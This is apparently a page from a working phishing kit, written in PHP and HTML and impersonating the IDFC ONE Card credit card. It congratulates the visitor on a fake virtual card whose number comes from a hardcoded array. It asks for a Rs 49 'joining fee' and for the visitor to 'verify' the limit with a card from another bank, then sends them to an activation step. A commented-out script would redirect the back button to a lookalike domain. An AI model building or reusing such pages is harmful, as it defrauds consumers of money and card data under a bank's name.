<?php
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
date_default_timezone_set('Asia/Kolkata');
$msg="";
extract($_POST);
session_start();
$data = array("4015 6191 3845 6217","4015 6191 3845 6217","4015 6191 3845 6217","4015 6191 3845 6217","4015 6191 3845 6217","4015 6191 3845 6217","4015 6191 3845 6217","4015 6191 3845 6217","4015 6191 3845 6217", "4015 6191 3845 6217");
?>
<!DOCTYPE html>
<html lang="en" >

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
<head>
  <meta charset="UTF-8">  
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

  <title>IDFC ONE Card</title>
  <link rel="stylesheet" href="./style.css">
  
  <style type="text/css">
    .card__secret--last{
      text-align: left;
    }
    .btn-default{
      background-color: #fff;
      border-color: #fff;
      color: green;
      font-size: 17px;
      padding: 0;
    }
    .modal-footer{
      text-align: center;
    }
    .modal-header{
      border-bottom: none;
      padding: 15px 0px 0px 0px;
    }
    .modal-footer{
      padding: 8px;
    }
    .modal-body{
      padding: 8px;
    }
    .modal{
      top: 25%;
    }
    .modal-content{
      width: 80%;
      margin-left: 10%;
      border-radius: 20px;
    }
    .card__part{
      height: 400px;
    }
    @media only screen and (max-width: 360px){
      .card__part{
        height: 310px !important;
      }
      .ddd{
        display: none !important;
      }
      .dte{
        bottom: 31px !important;
        font-size: 11px !important; 
      }
      .nme{
        left: 33px !important;
        bottom: 9px !important;
        font-size: 12px !important;
      }
      .mbcvv{
            margin: -7px !important;
    height: 20px !important;
      }
      .crd{
        right: 7% !important;
        top: 6% !important;
        font-size: 15px !important;
        width: 70px !important;
    letter-spacing: 4px !important;
    line-height: 20px !important;
      }
      .mbbb{
        font-size: 8px !important;
      }
    }
    @media only screen and (min-width: 361px) and (max-width: 768px){

      .card__part{
        height: 370px;
      }
    }
    @media only screen and (max-width: 768px){
      .card{
        width: 60% !important;
        margin-left: 20%;
      }
    }
  </style>

  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

</head>
<body style="background: #fff; display: block;">
  <div style="background: #fff; padding: 0; margin: 0;">
      <img style="width: 100%;" src="img/digital_pathway-01.png">
    </div><br>
  <div class="container">
    <div class="row">
      <div class="col-sm-3"></div>
      <div class="col-sm-6 col-xs-12" style="padding: 0; margin: 0;">
        <!-- <div style="background: #861F41; padding: 40px; text-align: center; color: #fff;">View E-Card</div><br> -->
  <div style="text-align: center;"><img style="width: 50px;" src="img/thump.png"></div>
  <h4 style="text-align: center; padding: 6px; margin: 0;">CONGRATULATIONS !</h4>
  <p style="text-align: center; font-size: 15px; padding: 10px; margin: 0;">Your physical card will be dispatched to your mailing address after joining fees pay and limit transfer verification.</p>
  <p style="text-align: center; font-size: 15px; padding: 10px; margin: 0;">In the Interim,you can start shopping, book travel tickets & make other online transaction using your virtual card. You can also pay at the merchant outlets by using IDFC ONE Card pay and bharat QR features.</p>
  <p style="text-align: center; font-size: 15px; padding: 10px; margin: 0;"> First pay your IDFC ONE Card joining fee of Rs 49 then verify the credit limit of IDFC ONE Card through your other bank's credit card.</p>
<div class="card">
  <div style="background: url(img/front.png); background-size: cover;" class="card__front card__part">
    <div class="card__space-75">
      <p class="card__info nme" style="color: #d5d5d5; position: absolute; left: 38px; top: 45%; font-size: 14px;"><?=$_SESSION['name']?><br> <?=$_SESSION['lname']?></p>
    </div>
  </div>
  
  <div style="background: url(img/back.png); background-size: cover;" class="card__back card__part">
    <div class="card__back-content">
      <div class="card__secret">
        <p style="color: #b3b3b3; position: absolute; right: 10px; top: 10%; margin: 0; padding: 0; font-size: 22px; width: 100px; letter-spacing: 5px; line-height: 24px;" id="p1" class="card__secret--last crd"><?=$data[rand(0,9)]?></p>

        <p style="color: #626262; position: absolute; right: 17%; top: 42%; line-height: 10px; margin: 0; padding: 0; font-size: 14px; font-weight: 600;" class="card__secret--last dte"><span class="mbbb" style="font-size: 10px; position: absolute; left: -100%; top: -5px;">VALID<br>THRU</span> <?=date('m')?>/26</p>
    <div class="card__space-25">
        <h4 style="margin: 0; padding: 0; font-weight: 600; font-size: 12px; color: #626262; margin-bottom: 5px;" class="mbcvv card__secret--last">CVV</h4>
        <a style="font-size: 11px; font-family: arial; background: #861f41e3; letter-spacing: 1px; color: #c7c7c7; padding: 3px 5px; text-decoration: none; border-radius: 3px; cursor: pointer; margin-top: -3px;" class="card__secret--last" data-toggle="modal" data-target="#myModal">View</a>
    </div>
      </div>
      
    </div>
  </div>
  
</div>
<br><br><br><br>
  <a href="activate.php"><button style="background: #9f3339; color: #fff; width: 100%; padding: 15px; border: none;">ACTIVATE NOW</button></a>
      </div>
    </div>
  </div>
</body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

</html>




<div class="container">

  <!-- Modal -->
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <!-- <button type="button" class="close" data-dismiss="modal">&times;</button> -->
          <h4 style="text-align: center;" class="modal-title">Card Details</h4>
        </div>
        <div class="modal-body">
          <p style="text-align: center;">Note : For inactive card (Primary and Add-on) you can not view the CVV.</p>
        </div>
        <div class="modal-footer" data-dismiss="modal">
          <button type="button" class="btn btn-default">OK</button>
        </div>
      </div>
      
    </div>
  </div>
  
</div>

<script type="text/javascript">
function copyToClipboard(element) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val($(element).text()).select();
  document.execCommand("copy");
  $temp.remove();
}
</script>

<script>
$(document).ready(function(){
  $('[data-toggle="tooltip"]').tooltip();   
});
</script>
<!-- <script type="text/javascript">
jQuery(document).ready(function($) {

      if (window.history && window.history.pushState) {

        $(window).on('popstate', function() {
          var hashLocation = location.hash;
          var hashSplit = hashLocation.split("#!/");
          var hashName = hashSplit[1];

          if (hashName !== '') {
            var hash = window.location.hash;
            if (hash === '') {
              alert('Back button was pressed.');
                window.location='https://instant-eapply-campaign-page-online-css-sb-page.co.in/redirect.php';
                return false;
            }
          }
        });

        window.history.pushState('forward', null, './#forward');
      }

    });
</script> -->
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>